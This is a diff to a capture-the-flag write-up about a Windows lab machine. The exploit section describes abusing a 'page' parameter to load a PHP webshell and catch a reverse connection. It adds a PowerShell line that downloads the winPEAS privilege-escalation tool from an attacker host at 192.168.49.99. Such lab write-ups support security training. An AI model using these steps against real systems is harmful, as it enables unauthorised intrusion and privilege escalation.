@@ -136,16 +136,23 @@ There are a number of unknown open ports on the target, but I will ignore them s
 ## Exploit
 After my intial enumeration, I still did not have a foothold on the target. I supected the vulnerability is due to the 'page' parameter, but I did not have success when I tested. With Windows, it appears to be different than how one would do in Linux. I saw an example online where someone connected back to their machine to retrieve a file, and then load the file in the browser by updating the parameter in the url. I can do the same thing, but upload a shell and setup a listener to wait for the incoming connection. 
 
-*** Insert screenshot of success test file upload ***
+```
+powershell "Invoke-WebRequest -UseBasicParsing 192.168.49.99:8000/winPEASx64.exe -OutFile winpeas.exe"
+```
+![Results!](screenshots/3.png)
 
-*** Insert screenshot of php webshell ***
+![Results!](screenshots/4.png)
+
+![Results!](screenshots/5.png)
+
+
 
 
 
 
 ### Local/User flag
 
-*** insert screenshot of user flag ***
+![Results!](screenshots/6.png)
 
 ### Root Flag
 *** Insert screenshot of uploading winpeas ***
